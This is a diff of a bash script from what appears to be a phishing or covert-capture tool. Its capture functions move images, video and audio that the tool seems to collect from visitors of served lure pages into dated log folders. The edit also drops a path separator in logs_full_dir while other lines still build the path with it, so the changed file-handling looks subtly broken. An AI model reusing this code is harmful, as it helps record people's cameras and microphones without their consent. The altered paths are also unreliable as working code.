@@ -30,7 +30,7 @@ sites_dir="${pro_dir}/.sites" #sites directory
 date=$(date +%d-%m-%Y)
 time=$(date +%H-%M-%S)
 logs_dir=$(date +%d-%m-%Y-%H-%M-%S)
-logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+logs_full_dir="${files_dir}/${site_name}${logs_dir}"
 
 #Normal Banner
 banner(){
@@ -581,11 +581,11 @@ capture_data_image() {
 			echo -ne " "
                    	rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-	               		mv .server/www/*.wav  "${logs_full_dir}/image-${filename}.png"
+	               		mv .server/www/*.png  "${logs_full_dir}/image-${filename}.png"
 			else
 				mkdir ${logs_dir}
 				mv ${logs_dir} ${files_dir}/${site_name}/
-				mv .server/www/*.wav  "${logs_full_dir}/image-${filename}.png"
+				mv .server/www/*.png  "${logs_full_dir}/image-${filename}.png"
 			fi
                 fi
                 sleep 0.5
@@ -639,7 +639,8 @@ capture_data_video() {
                         else
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
-                                mv .server/www/*.webm  "${logs_full_dir}/video-${filename}.webm"
+				mv .server/www/*.webm "video-${filename}.webm"
+                                mv "video-${filename}.webm"  "${logs_full_dir}"
                         fi
                 fi
                 sleep 0.5
@@ -662,7 +663,7 @@ capture_data_video_audio() {
 			echo -ne " "
                         rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-                                mv .server/www/*.webm  ${logs_full_dir}/
+                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
                         else
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
